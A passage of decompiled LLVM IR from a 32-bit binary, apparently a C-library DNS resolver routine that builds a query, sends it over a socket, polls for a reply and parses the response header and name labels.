  %v1_804da75 = add i32 %v0_804da75, -4
  %v2_804da75 = inttoptr i32 %v1_804da75 to i32*
  store i32 28, i32* %v2_804da75, align 4
  %v0_804da77 = load i32, i32* %eax.global-to-local, align 4
  %v2_804da77 = add i32 %v0_804da75, -8
  %v3_804da77 = inttoptr i32 %v2_804da77 to i32*
  store i32 %v0_804da77, i32* %v3_804da77, align 4
  %v1_804da78 = add i32 %v0_804da75, 416
  store i32 %v1_804da78, i32* %eax.global-to-local, align 4
  %v2_804da7f = add i32 %v0_804da75, -12
  %v3_804da7f = inttoptr i32 %v2_804da7f to i32*
  store i32 %v1_804da78, i32* %v3_804da7f, align 4
  %v4_804da80 = call i32 @memcpy(i8* %v3_804da80, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804da80, i32* %eax.global-to-local, align 4
  %v0_804da85 = load i32, i32* @esp, align 4
  %v1_804da85 = add i32 %v0_804da85, -4
  %v2_804da85 = inttoptr i32 %v1_804da85 to i32*
  store i32 1, i32* %v2_804da85, align 4
  %v0_804da87 = load i32, i32* @ebx, align 4
  %v2_804da87 = add i32 %v0_804da85, -8
  %v3_804da87 = inttoptr i32 %v2_804da87 to i32*
  store i32 %v0_804da87, i32* %v3_804da87, align 4
  %v3_804da88 = call i32 @_pthread_cleanup_pop_restore(i32* %v3_804d9c2, i32 %v3_804d8fe)
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 128, i32* %ecx.global-to-local, align 4
  %v5_804da96 = call i8* @_memset(i8* %v1_804d8fb, i32 0, i32 128)
  store i32 12, i32* %ecx.global-to-local, align 4
  %v0_804da9d = load i32, i32* @esp, align 4
  %v1_804da9d = add i32 %v0_804da9d, 348
  store i32 %v1_804da9d, i32* %edx.global-to-local, align 4
  %v2_804daa4 = add i32 %v0_804da9d, 24
  %v3_804daa4 = inttoptr i32 %v2_804daa4 to i32*
  store i32 %v1_804da9d, i32* %v3_804daa4, align 4
  %v0_804daa8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804daa8 = inttoptr i32 %v0_804daa8 to i8*
  store i32 %v0_804daa8, i32* @edi, align 4
  %v5_804daaa = call i8* @_memset(i8* %v1_804daa8, i32 0, i32 12)
  %v6_804daaa = ptrtoint i8* %v5_804daaa to i32
  store i32 %v6_804daaa, i32* %ecx.global-to-local, align 4
  %v0_804daac = load i32, i32* @esp, align 4
  %v1_804daac = add i32 %v0_804daac, 76
  %v2_804daac = inttoptr i32 %v1_804daac to i32*
  %v3_804daac = load i32, i32* %v2_804daac, align 4
  store i32 %v3_804daac, i32* %ecx.global-to-local, align 4
  %v2_804dab0 = add i32 %v0_804daac, 348
  %v3_804dab0 = inttoptr i32 %v2_804dab0 to i32*
  store i32 %v3_804daac, i32* %v3_804dab0, align 4
  %v0_804dab7 = load i32, i32* @esp, align 4
  %v1_804dab7 = add i32 %v0_804dab7, 380
  %v2_804dab7 = inttoptr i32 %v1_804dab7 to i32*
  store i32 1, i32* %v2_804dab7, align 4
  %v0_804dac2 = load i32, i32* @esp, align 4
  %v1_804dac2 = add i32 %v0_804dac2, 368
  %v2_804dac2 = inttoptr i32 %v1_804dac2 to i32*
  store i32 1, i32* %v2_804dac2, align 4
  %v0_804dacd = load i32, i32* @esp, align 4
  %v1_804dacd = add i32 %v0_804dacd, -4
  %v2_804dacd = inttoptr i32 %v1_804dacd to i32*
  store i32 512, i32* %v2_804dacd, align 4
  %v3_804dad2 = add i32 %v0_804dacd, -8
  %v4_804dad2 = inttoptr i32 %v3_804dad2 to i32*
  store i32 %v1_804d8f6, i32* %v4_804dad2, align 4
  %v1_804dad3 = add i32 %v0_804dacd, 348
  store i32 %v1_804dad3, i32* %eax.global-to-local, align 4
  %v2_804dada = add i32 %v0_804dacd, -12
  %v3_804dada = inttoptr i32 %v2_804dada to i32*
  store i32 %v1_804dad3, i32* %v3_804dada, align 4
  %v0_804dadb = call i32 @__encode_header()
  store i32 %v0_804dadb, i32* %eax.global-to-local, align 4
  store i32 %v0_804dadb, i32* @ebx, align 4
  %v0_804dae2 = load i32, i32* @esp, align 4
  %v1_804dae2 = add i32 %v0_804dae2, 32
  %v2_804dae5 = icmp slt i32 %v0_804dadb, 0
  br i1 %v2_804dae5, label %dec_label_pc_804dfab, label %dec_label_pc_804daed

dec_label_pc_804daed:                             ; preds = %dec_label_pc_804da3b
  %v1_804daed = add i32 %v0_804dae2, 76
  %v2_804daed = inttoptr i32 %v1_804daed to i32*
  %v3_804daed = load i32, i32* %v2_804daed, align 4
  store i32 %v3_804daed, i32* %edx.global-to-local, align 4
  %v2_804daf1 = add i32 %v0_804dae2, 492
  %v3_804daf1 = inttoptr i32 %v2_804daf1 to i32*
  store i32 %v3_804daed, i32* %v3_804daf1, align 4
  %v0_804daf8 = load i32, i32* @esp, align 4
  %v1_804daf8 = add i32 %v0_804daf8, 504
  %v2_804daf8 = inttoptr i32 %v1_804daf8 to i32*
  %v3_804daf8 = load i32, i32* %v2_804daf8, align 4
  store i32 %v3_804daf8, i32* %ecx.global-to-local, align 4
  %v2_804daff = add i32 %v0_804daf8, 464
  %v3_804daff = inttoptr i32 %v2_804daff to i32*
  store i32 %v3_804daf8, i32* %v3_804daff, align 4
  %v0_804db06 = load i32, i32* @esp, align 4
  %v1_804db06 = add i32 %v0_804db06, 468
  %v2_804db06 = inttoptr i32 %v1_804db06 to i32*
  store i32 1, i32* %v2_804db06, align 4
  %v1_804db16 = load i32, i32* @ebx, align 4
  %v2_804db16 = sub i32 512, %v1_804db16
  %v1_804db18 = load i32, i32* @esp, align 4
  %v2_804db18 = add i32 %v1_804db18, -4
  %v3_804db18 = inttoptr i32 %v2_804db18 to i32*
  store i32 %v2_804db16, i32* %v3_804db18, align 4
  %v2_804db19 = load i32, i32* @ebx, align 4
  %v3_804db19 = add i32 %v2_804db19, %v1_804d8f6
  %v2_804db1d = add i32 %v1_804db18, -8
  %v3_804db1d = inttoptr i32 %v2_804db1d to i32*
  store i32 %v3_804db19, i32* %v3_804db1d, align 4
  %v1_804db1e = add i32 %v1_804db18, 460
  store i32 %v1_804db1e, i32* %eax.global-to-local, align 4
  %v2_804db25 = add i32 %v1_804db18, -12
  %v3_804db25 = inttoptr i32 %v2_804db25 to i32*
  store i32 %v1_804db1e, i32* %v3_804db25, align 4
  %v0_804db26 = call i32 @__encode_question()
  store i32 %v0_804db26, i32* %eax.global-to-local, align 4
  store i32 %v0_804db26, i32* @esi, align 4
  %v0_804db2d = load i32, i32* @esp, align 4
  %v1_804db2d = add i32 %v0_804db2d, 12
  %v2_804db30 = icmp slt i32 %v0_804db26, 0
  br i1 %v2_804db30, label %dec_label_pc_804dfab, label %dec_label_pc_804db38

dec_label_pc_804db38:                             ; preds = %dec_label_pc_804daed
  %v1_804db38 = add i32 %v0_804db2d, 8
  %v2_804db38 = inttoptr i32 %v1_804db38 to i32*
  store i32 17, i32* %v2_804db38, align 4
  %v1_804db3a = add i32 %v0_804db2d, 4
  %v2_804db3a = inttoptr i32 %v1_804db3a to i32*
  store i32 2, i32* %v2_804db3a, align 4
  %v1_804db3c = add i32 %v0_804db2d, 428
  %v2_804db3c = inttoptr i32 %v1_804db3c to i16*
  %v3_804db3c = load i16, i16* %v2_804db3c, align 2
  %v4_804db3c = zext i16 %v3_804db3c to i32
  store i32 %v4_804db3c, i32* %eax.global-to-local, align 4
  %v3_804db44 = inttoptr i32 %v0_804db2d to i32*
  store i32 %v4_804db3c, i32* %v3_804db44, align 4
  %v3_804db45 = call i32 @socket(i32 %v3_804d997, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804db45, i32* %eax.global-to-local, align 4
  %v1_804db4a = load i32, i32* @esp, align 4
  %v2_804db4a = add i32 %v1_804db4a, 40
  %v3_804db4a = inttoptr i32 %v2_804db4a to i32*
  store i32 %v3_804db45, i32* %v3_804db4a, align 4
  %v0_804db4e = load i32, i32* @esp, align 4
  %v1_804db4e = add i32 %v0_804db4e, 12
  %v2_804db51 = icmp slt i32 %v3_804db45, 0
  br i1 %v2_804db51, label %dec_label_pc_804df8f, label %dec_label_pc_804db59

dec_label_pc_804db59:                             ; preds = %dec_label_pc_804db38
  %v1_804db59 = add i32 %v0_804db4e, 8
  %v2_804db59 = inttoptr i32 %v1_804db59 to i32*
  store i32 28, i32* %v2_804db59, align 4
  %v1_804db5b = add i32 %v0_804db4e, 428
  store i32 %v1_804db5b, i32* %eax.global-to-local, align 4
  %v2_804db62 = add i32 %v0_804db4e, 4
  %v3_804db62 = inttoptr i32 %v2_804db62 to i32*
  store i32 %v1_804db5b, i32* %v3_804db62, align 4
  %v1_804db63 = add i32 %v0_804db4e, 40
  %v2_804db63 = inttoptr i32 %v1_804db63 to i32*
  %v3_804db63 = load i32, i32* %v2_804db63, align 4
  %v6_804db63 = inttoptr i32 %v0_804db4e to i32*
  store i32 %v3_804db63, i32* %v6_804db63, align 4
  %v3_804db67 = call i32 @__libc_connect(i32 %v3_804d997, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804db67, i32* %eax.global-to-local, align 4
  %v0_804db6c = load i32, i32* @esp, align 4
  %v1_804db6c = add i32 %v0_804db6c, 12
  %v2_804db6f = icmp slt i32 %v3_804db67, 0
  br i1 %v2_804db6f, label %dec_label_pc_804df8f, label %dec_label_pc_804db77

dec_label_pc_804db77:                             ; preds = %dec_label_pc_804db59
  %v1_804db77 = add i32 %v0_804db6c, 8
  %v2_804db77 = inttoptr i32 %v1_804db77 to i32*
  store i32 0, i32* %v2_804db77, align 4
  %v0_804db79 = load i32, i32* @esi, align 4
  %v1_804db79 = load i32, i32* @ebx, align 4
  %v2_804db79 = add i32 %v1_804db79, %v0_804db79
  store i32 %v2_804db79, i32* %eax.global-to-local, align 4
  %v2_804db7c = add i32 %v0_804db6c, 4
  %v3_804db7c = inttoptr i32 %v2_804db7c to i32*
  store i32 %v2_804db79, i32* %v3_804db7c, align 4
  %v4_804db7d = inttoptr i32 %v0_804db6c to i32*
  store i32 %v1_804d8f6, i32* %v4_804db7d, align 4
  %v1_804db7e = add i32 %v0_804db6c, 40
  %v2_804db7e = inttoptr i32 %v1_804db7e to i32*
  %v3_804db7e = load i32, i32* %v2_804db7e, align 4
  %v5_804db7e = add i32 %v0_804db6c, -4
  %v6_804db7e = inttoptr i32 %v5_804db7e to i32*
  store i32 %v3_804db7e, i32* %v6_804db7e, align 4
  %v4_804db82 = call i32 @__libc_send(i32 %v3_804d997, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804db87 = load i8, i8* bitcast (i64* @global_var_8053584.111 to i8*), align 8
  %v1_804db87 = zext i8 %v0_804db87 to i32
  store i32 %v1_804db87, i32* %eax.global-to-local, align 4
  %v3_804db8e = mul nuw nsw i32 %v1_804db87, 1000
  store i32 %v3_804db8e, i32* @ebx, align 4
  %v0_804db94 = load i32, i32* @esp, align 4
  %v1_804db94 = add i32 %v0_804db94, 16
  %v1_804db97 = add i32 %v0_804db94, 488
  store i32 %v1_804db97, i32* @esi, align 4
  %v1_804db9e = add i32 %v0_804db94, 344
  store i32 %v1_804db9e, i32* @edi, align 4
  br label %dec_label_pc_804dba5

dec_label_pc_804dba5:                             ; preds = %dec_label_pc_804dbfc, %dec_label_pc_804db77
  %v0_804dba5 = phi i32 [ %v0_804dbf1, %dec_label_pc_804dbfc ], [ %v1_804db94, %dec_label_pc_804db77 ]
  %v1_804dba5 = add i32 %v0_804dba5, 28
  %v2_804dba5 = inttoptr i32 %v1_804dba5 to i32*
  %v3_804dba5 = load i32, i32* %v2_804dba5, align 4
  store i32 %v3_804dba5, i32* %edx.global-to-local, align 4
  %v2_804dba9 = add i32 %v0_804dba5, 472
  %v3_804dba9 = inttoptr i32 %v2_804dba9 to i32*
  store i32 %v3_804dba5, i32* %v3_804dba9, align 4
  %v0_804dbb0 = load i32, i32* @esp, align 4
  %v1_804dbb0 = add i32 %v0_804dbb0, 476
  %v2_804dbb0 = inttoptr i32 %v1_804dbb0 to i16*
  store i16 1, i16* %v2_804dbb0, align 2
  %v0_804dbba = load i32, i32* @ebx, align 4
  %v1_804dbba = load i32, i32* @esp, align 4
  %v2_804dbba = add i32 %v1_804dbba, -4
  %v3_804dbba = inttoptr i32 %v2_804dbba to i32*
  store i32 %v0_804dbba, i32* %v3_804dbba, align 4
  %v1_804dbbb = add i32 %v1_804dbba, -8
  %v2_804dbbb = inttoptr i32 %v1_804dbbb to i32*
  store i32 1, i32* %v2_804dbbb, align 4
  %v0_804dbbd = load i32, i32* @esi, align 4
  %v2_804dbbd = add i32 %v1_804dbba, -12
  %v3_804dbbd = inttoptr i32 %v2_804dbbd to i32*
  store i32 %v0_804dbbd, i32* %v3_804dbbd, align 4
  %v0_804dbbe = call i32 @__GI_poll()
  store i32 %v0_804dbbe, i32* %eax.global-to-local, align 4
  %v0_804dbc3 = load i32, i32* @esp, align 4
  %v1_804dbc3 = add i32 %v0_804dbc3, 12
  %tmp47 = icmp slt i32 %v0_804dbbe, 1
  br i1 %tmp47, label %dec_label_pc_804df8f, label %dec_label_pc_804dbce

dec_label_pc_804dbce:                             ; preds = %dec_label_pc_804dba5
  %v1_804dbce = add i32 %v0_804dbc3, 8
  %v2_804dbce = inttoptr i32 %v1_804dbce to i32*
  store i32 64, i32* %v2_804dbce, align 4
  %v1_804dbd0 = add i32 %v0_804dbc3, 4
  %v2_804dbd0 = inttoptr i32 %v1_804dbd0 to i32*
  store i32 512, i32* %v2_804dbd0, align 4
  %v4_804dbd5 = inttoptr i32 %v0_804dbc3 to i32*
  store i32 %v1_804d8f6, i32* %v4_804dbd5, align 4
  %v1_804dbd6 = add i32 %v0_804dbc3, 40
  %v2_804dbd6 = inttoptr i32 %v1_804dbd6 to i32*
  %v3_804dbd6 = load i32, i32* %v2_804dbd6, align 4
  %v5_804dbd6 = add i32 %v0_804dbc3, -4
  %v6_804dbd6 = inttoptr i32 %v5_804dbd6 to i32*
  store i32 %v3_804dbd6, i32* %v6_804dbd6, align 4
  %v4_804dbda = call i32 @__libc_recv(i32 %v3_804d997, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dbda, i32* %eax.global-to-local, align 4
  %v1_804dbdf = load i32, i32* @esp, align 4
  %v2_804dbdf = add i32 %v1_804dbdf, 48
  %v3_804dbdf = inttoptr i32 %v2_804dbdf to i32*
  store i32 %v4_804dbda, i32* %v3_804dbdf, align 4
  %v0_804dbe3 = load i32, i32* @esp, align 4
  %v1_804dbe3 = add i32 %v0_804dbe3, 16
  %v1_804dbe6 = add i32 %v4_804dbda, -11
  %v6_804dbe6 = sub i32 10, %v4_804dbda
  %v7_804dbe6 = and i32 %v6_804dbe6, %v4_804dbda
  %v8_804dbe6 = icmp slt i32 %v7_804dbe6, 0
  %v9_804dbe6 = icmp eq i32 %v1_804dbe6, 0
  %v10_804dbe6 = icmp slt i32 %v1_804dbe6, 0
  %v3_804dbe9 = icmp eq i1 %v10_804dbe6, %v8_804dbe6
  %v4_804dbe9 = icmp eq i1 %v9_804dbe6, false
  %v5_804dbe9 = and i1 %v4_804dbe9, %v3_804dbe9
  br i1 %v5_804dbe9, label %dec_label_pc_804dc06, label %dec_label_pc_804dbeb

dec_label_pc_804dbeb:                             ; preds = %dec_label_pc_804dc1c, %dec_label_pc_804dc06, %dec_label_pc_804dbce
  %v0_804dbf1 = phi i32 [ %v3_804dc0e, %dec_label_pc_804dc1c ], [ %v3_804dc0e, %dec_label_pc_804dc06 ], [ %v1_804dbe3, %dec_label_pc_804dbce ]
  %v0_804dbeb = load i32, i32* @ebx, align 4
  %v1_804dbeb = add i32 %v0_804dbeb, -1000
  store i32 %v1_804dbeb, i32* @ebx, align 4
  %v1_804dbf1 = add i32 %v0_804dbf1, 32
  %v2_804dbf1 = inttoptr i32 %v1_804dbf1 to i32*
  %v3_804dbf1 = load i32, i32* %v2_804dbf1, align 4
  %v5_804dbf1 = icmp slt i32 %v3_804dbf1, 0
  br i1 %v5_804dbf1, label %dec_label_pc_804df8f, label %dec_label_pc_804dbfc

dec_label_pc_804dbfc:                             ; preds = %dec_label_pc_804dbeb
  %v9_804dbeb = icmp eq i32 %v1_804dbeb, 0
  br i1 %v9_804dbeb, label %dec_label_pc_804df8f, label %dec_label_pc_804dba5

dec_label_pc_804dc06:                             ; preds = %dec_label_pc_804dbce
  %v0_804dc06 = load i32, i32* @edi, align 4
  %v2_804dc06 = add i32 %v0_804dbe3, 12
  %v3_804dc06 = inttoptr i32 %v2_804dc06 to i32*
  store i32 %v0_804dc06, i32* %v3_804dc06, align 4
  %v3_804dc07 = add i32 %v0_804dbe3, 8
  %v4_804dc07 = inttoptr i32 %v3_804dc07 to i32*
  store i32 %v1_804d8f6, i32* %v4_804dc07, align 4
  %v0_804dc08 = call i32 @__decode_header()
  store i32 %v0_804dc08, i32* %eax.global-to-local, align 4
  %v0_804dc0d = load i32, i32* @esp, align 4
  %v1_804dc0d = inttoptr i32 %v0_804dc0d to i32*
  %v2_804dc0d = load i32, i32* %v1_804dc0d, align 4
  store i32 %v2_804dc0d, i32* %eax.global-to-local, align 4
  %v3_804dc0d = add i32 %v0_804dc0d, 4
  %v1_804dc0e = inttoptr i32 %v3_804dc0d to i32*
  %v2_804dc0e = load i32, i32* %v1_804dc0e, align 4
  store i32 %v2_804dc0e, i32* %edx.global-to-local, align 4
  %v3_804dc0e = add i32 %v0_804dc0d, 8
  %v1_804dc0f = add i32 %v0_804dc0d, 64
  %v2_804dc0f = inttoptr i32 %v1_804dc0f to i32*
  %v3_804dc0f = load i32, i32* %v2_804dc0f, align 4
  store i32 %v3_804dc0f, i32* @ecx, align 4
  %v1_804dc13 = add i32 %v0_804dc0d, 336
  %v2_804dc13 = inttoptr i32 %v1_804dc13 to i32*
  %v3_804dc13 = load i32, i32* %v2_804dc13, align 4
  %v15_804dc13 = icmp eq i32 %v3_804dc13, %v3_804dc0f
  %v1_804dc1a = icmp eq i1 %v15_804dc13, false
  br i1 %v1_804dc1a, label %dec_label_pc_804dbeb, label %dec_label_pc_804dc1c

dec_label_pc_804dc1c:                             ; preds = %dec_label_pc_804dc06
  %v1_804dc1c = add i32 %v0_804dc0d, 340
  %v2_804dc1c = inttoptr i32 %v1_804dc1c to i32*
  %v3_804dc1c = load i32, i32* %v2_804dc1c, align 4
  %v4_804dc1c = icmp eq i32 %v3_804dc1c, 0
  br i1 %v4_804dc1c, label %dec_label_pc_804dbeb, label %dec_label_pc_804dc26

dec_label_pc_804dc26:                             ; preds = %dec_label_pc_804dc1c
  %v1_804dc26 = add i32 %v0_804dc0d, 364
  %v2_804dc26 = inttoptr i32 %v1_804dc26 to i32*
  %v3_804dc26 = load i32, i32* %v2_804dc26, align 4
  store i32 %v3_804dc26, i32* %edx.global-to-local, align 4
  %v1_804dc2d = add i32 %v3_804dc26, -2
  store i32 %v1_804dc2d, i32* %eax.global-to-local, align 4
  %v5_804dc30 = icmp eq i32 %v1_804dc2d, 0
  %v9_804dc30 = icmp eq i32 %v3_804dc26, 3
  %v2_804dc33 = or i1 %v9_804dc30, %v5_804dc30
  br i1 %v2_804dc33, label %dec_label_pc_804dc35, label %dec_label_pc_804dc60

dec_label_pc_804dc35:                             ; preds = %dec_label_pc_804dc26
  %v1_804dc35 = add i32 %v0_804dc0d, 27
  %v2_804dc35 = inttoptr i32 %v1_804dc35 to i8*
  %v3_804dc35 = load i8, i8* %v2_804dc35, align 1
  %v12_804dc35 = icmp eq i8 %v3_804dc35, 46
  br i1 %v12_804dc35, label %dec_label_pc_804dc50, label %dec_label_pc_804dc3c

dec_label_pc_804dc3c:                             ; preds = %dec_label_pc_804dc35
  %v1_804dc3c = add i32 %v0_804dc0d, 28
  %v2_804dc3c = inttoptr i32 %v1_804dc3c to i32*
  %v3_804dc3c = load i32, i32* %v2_804dc3c, align 4
  %v1_804dc40 = add i32 %v3_804dc3c, -1
  store i32 %v1_804dc40, i32* %eax.global-to-local, align 4
  %v1_804dc41 = add i32 %v0_804dc0d, 56
  %v2_804dc41 = inttoptr i32 %v1_804dc41 to i32*
  %v3_804dc41 = load i32, i32* %v2_804dc41, align 4
  %v5_804dc41 = sub i32 %v3_804dc41, %v1_804dc40
  %v11_804dc41 = xor i32 %v3_804dc41, %v1_804dc40
  %v12_804dc41 = xor i32 %v5_804dc41, %v3_804dc41
  %v13_804dc41 = and i32 %v12_804dc41, %v11_804dc41
  %v14_804dc41 = icmp slt i32 %v13_804dc41, 0
  %v16_804dc41 = icmp slt i32 %v5_804dc41, 0
  %v2_804dc45 = icmp eq i1 %v16_804dc41, %v14_804dc41
  br i1 %v2_804dc45, label %dec_label_pc_804dc50, label %dec_label_pc_804dc47

dec_label_pc_804dc47:                             ; preds = %dec_label_pc_804dc3c
  %v4_804dc47 = add i32 %v3_804dc41, 1
  store i32 %v4_804dc47, i32* %v2_804dc41, align 4
  br label %dec_label_pc_804df9b

dec_label_pc_804dc50:                             ; preds = %dec_label_pc_804dc3c, %dec_label_pc_804dc35
  %v0_804dc50 = call i32 @__GI___h_errno_location()
  store i32 %v0_804dc50, i32* %eax.global-to-local, align 4
  %v1_804dc55 = inttoptr i32 %v0_804dc50 to i32*
  store i32 1, i32* %v1_804dc55, align 4
  br label %dec_label_pc_804dfc5

dec_label_pc_804dc60:                             ; preds = %dec_label_pc_804dc26
  %v1_804dc60 = icmp eq i32 %v3_804dc26, 0
  %v1_804dc62 = icmp eq i1 %v1_804dc60, false
  br i1 %v1_804dc62, label %dec_label_pc_804df8f, label %dec_label_pc_804dc68

dec_label_pc_804dc68:                             ; preds = %dec_label_pc_804dc60
  %v1_804dc68 = add i32 %v0_804dc0d, 372
  %v2_804dc68 = inttoptr i32 %v1_804dc68 to i32*
  %v3_804dc68 = load i32, i32* %v2_804dc68, align 4
  %tmp48 = icmp slt i32 %v3_804dc68, 1
  br i1 %tmp48, label %dec_label_pc_804dc84, label %dec_label_pc_804dc72

dec_label_pc_804dc72:                             ; preds = %dec_label_pc_804dc68
  %v1_804dc72 = add i32 %v0_804dc0d, 68
  %v2_804dc72 = inttoptr i32 %v1_804dc72 to i32*
  store i32 12, i32* %v2_804dc72, align 4
  %v0_804dc7a = load i32, i32* @esp, align 4
  %v1_804dc7a = add i32 %v0_804dc7a, 24
  %v2_804dc7a = inttoptr i32 %v1_804dc7a to i32*
  store i32 0, i32* %v2_804dc7a, align 4
  %v0_804dcfe68 = load i32, i32* @esp, align 4
  %v1_804dcfe69 = add i32 %v0_804dcfe68, 24
  %v2_804dcfe70 = inttoptr i32 %v1_804dcfe69 to i32*
  %v3_804dcfe71 = load i32, i32* %v2_804dcfe70, align 4
  store i32 %v3_804dcfe71, i32* @eax, align 4
  %v2_804dd0272 = add i32 %v0_804dcfe68, 360
  %v3_804dd0273 = inttoptr i32 %v2_804dd0272 to i32*
  %v4_804dd0274 = load i32, i32* %v3_804dd0273, align 4
  %v5_804dd0275 = sub i32 %v3_804dcfe71, %v4_804dd0274
  %v11_804dd0276 = xor i32 %v4_804dd0274, %v3_804dcfe71
  %v12_804dd0277 = xor i32 %v5_804dd0275, %v3_804dcfe71
  %v13_804dd0278 = and i32 %v12_804dd0277, %v11_804dd0276
  %v14_804dd0279 = icmp slt i32 %v13_804dd0278, 0
  %v16_804dd0281 = icmp slt i32 %v5_804dd0275, 0
  %v2_804dd0982 = icmp eq i1 %v16_804dd0281, %v14_804dd0279
  br i1 %v2_804dd0982, label %dec_label_pc_804dd0b, label %dec_label_pc_804dc94

dec_label_pc_804dc84:                             ; preds = %dec_label_pc_804dc68
  %v0_804dc84 = call i32 @__GI___h_errno_location()
  store i32 %v0_804dc84, i32* %eax.global-to-local, align 4
  %v1_804dc89 = inttoptr i32 %v0_804dc84 to i32*
  store i32 4, i32* %v1_804dc89, align 4
  br label %dec_label_pc_804dfc5

dec_label_pc_804dc94:                             ; preds = %dec_label_pc_804dc72, %dec_label_pc_804dcf6
  %v3_804dcfe84 = phi i32 [ %v3_804dcfe, %dec_label_pc_804dcf6 ], [ %v3_804dcfe71, %dec_label_pc_804dc72 ]
  %v0_804dcfe83 = phi i32 [ %v0_804dcfe, %dec_label_pc_804dcf6 ], [ %v0_804dcfe68, %dec_label_pc_804dc72 ]
  %v1_804dc94 = add i32 %v0_804dcfe83, 60
  %v2_804dc94 = inttoptr i32 %v1_804dc94 to i32*
  %v3_804dc94 = load i32, i32* %v2_804dc94, align 4
  %v3_804dc98 = add i32 %v3_804dc94, %v1_804d8f6
  %v13_804dc98 = icmp eq i32 %v3_804dc98, 0
  store i32 %v3_804dc98, i32* @edi, align 4
  br i1 %v13_804dc98, label %dec_label_pc_804df8f, label %dec_label_pc_804dca0

dec_label_pc_804dca0:                             ; preds = %dec_label_pc_804dc94
  %v1_804dca0 = add i32 %v0_804dcfe83, 32
  %v2_804dca0 = inttoptr i32 %v1_804dca0 to i32*
  %v3_804dca0 = load i32, i32* %v2_804dca0, align 4
  %v4_804dca4 = load i32, i32* %v2_804dc94, align 4
  %v5_804dca4 = sub i32 %v3_804dca0, %v4_804dca4
  store i32 %v5_804dca4, i32* @ebx, align 4
  store i32 %v3_804dc98, i32* @esi, align 4
  %tmp4963 = icmp slt i32 %v5_804dca4, 1
  br i1 %tmp4963, label %dec_label_pc_804df8f, label %dec_label_pc_804dcb2

dec_label_pc_804dcb2:                             ; preds = %dec_label_pc_804dca0, %dec_label_pc_804dcd4
  %v0_804dcd766 = phi i32 [ %v1_804dcdb, %dec_label_pc_804dcd4 ], [ %v5_804dca4, %dec_label_pc_804dca0 ]
  %v0_804dccc65 = phi i32 [ %v2_804dcd4, %dec_label_pc_804dcd4 ], [ %v3_804dc98, %dec_label_pc_804dca0 ]
  %v4_804dcb264 = phi i32 [ %v2_804dcd9, %dec_label_pc_804dcd4 ], [ %v3_804dcfe84, %dec_label_pc_804dca0 ]
  %v1_804dcb2 = inttoptr i32 %v0_804dccc65 to i8*
  %v2_804dcb2 = load i8, i8* %v1_804dcb2, align 1
  %v3_804dcb2 = zext i8 %v2_804dcb2 to i32
  %v5_804dcb2 = and i32 %v4_804dcb264, -256
  %v6_804dcb2 = or i32 %v3_804dcb2, %v5_804dcb2
  store i32 %v6_804dcb2, i32* %eax.global-to-local, align 4
  %v1_804dcb4 = add i32 %v0_804dccc65, 1
  store i32 %v1_804dcb4, i32* @ecx, align 4
  %v4_804dcb7 = icmp eq i8 %v2_804dcb2, 0
  br i1 %v4_804dcb7, label %dec_label_pc_804dce0, label %dec_label_pc_804dcbb

dec_label_pc_804dcbb:                             ; preds = %dec_label_pc_804dcb2
  store i32 %v3_804dcb2, i32* %edx.global-to-local, align 4
  %v1_804dcc0 = and i32 %v3_804dcb2, 192
  store i32 %v1_804dcc0, i32* %eax.global-to-local, align 4
  %v6_804dcc5 = icmp eq i32 %v1_804dcc0, 192
  %v1_804dcca = icmp eq i1 %v6_804dcc5, false
  br i1 %v1_804dcca, label %dec_label_pc_804dcd4, label %dec_label_pc_804dccc

dec_label_pc_804dccc:                             ; preds = %dec_label_pc_804dcbb
  %v1_804dccc = add i32 %v0_804dccc65, 2
  store i32 %v1_804dccc, i32* @ecx, align 4
  %v1_804dccf = add i32 %v0_804dcd766, -2
  store i32 %v1_804dccf, i32* @ebx, align 4
  br label %dec_label_pc_804dce0

dec_label_pc_804dcd4:                             ; preds = %dec_label_pc_804dcbb
  %v2_804dcd4 = add i32 %v3_804dcb2, %v1_804dcb4
  store i32 %v2_804dcd4, i32* @esi, align 4
  %v2_804dcd9 = sub i32 %v0_804dcd766, %v3_804dcb2
  store i32 %v2_804dcd9, i32* %eax.global-to-local, align 4
  %v1_804dcdb = add i32 %v2_804dcd9, -1
  store i32 %v1_804dcdb, i32* @ebx, align 4
  %tmp49 = icmp slt i32 %v1_804dcdb, 1
  br i1 %tmp49, label %dec_label_pc_804df8f, label %dec_label_pc_804dcb2

dec_label_pc_804dce0:                             ; preds = %dec_label_pc_804dcb2, %dec_label_pc_804dccc
  %v0_804dce9 = phi i32 [ %v1_804dccc, %dec_label_pc_804dccc ], [ %v1_804dcb4, %dec_label_pc_804dcb2 ]
  %v0_804dce0 = phi i32 [ %v1_804dccf, %dec_label_pc_804dccc ], [ %v0_804dcd766, %dec_label_pc_804dcb2 ]
  %v1_804dce0 = add i32 %v0_804dce0, -3
  %v6_804dce0 = sub i32 2, %v0_804dce0
  %v7_804dce0 = and i32 %v6_804dce0, %v0_804dce0
  %v8_804dce0 = icmp slt i32 %v7_804dce0, 0
  %v9_804dce0 = icmp eq i32 %v1_804dce0, 0
  %v10_804dce0 = icmp slt i32 %v1_804dce0, 0
  %v3_804dce3 = icmp ne i1 %v10_804dce0, %v8_804dce0
  %v4_804dce3 = or i1 %v9_804dce0, %v3_804dce3
  br i1 %v4_804dce3, label %dec_label_pc_804df8f, label %dec_label_pc_804dce9

dec_label_pc_804dce9:                             ; preds = %dec_label_pc_804dce0
  %v2_804dce9 = sub i32 %v0_804dce9, %v3_804dc98
  store i32 %v2_804dce9, i32* @ecx, align 4
  %v1_804dced = add i32 %v2_804dce9, 4
  %v10_804dced = icmp slt i32 %v1_804dced, 0
  store i32 %v1_804dced, i32* %eax.global-to-local, align 4
  br i1 %v10_804dced, label %dec_label_pc_804df8f, label %dec_label_pc_804dcf6

dec_label_pc_804dcf6:                             ; preds = %dec_label_pc_804dce9
  %v3_804dcf6 = load i32, i32* %v2_804dc94, align 4
  %v5_804dcf6 = add i32 %v3_804dcf6, %v1_804dced
  store i32 %v5_804dcf6, i32* %v2_804dc94, align 4
  %v0_804dcfa = load i32, i32* @esp, align 4
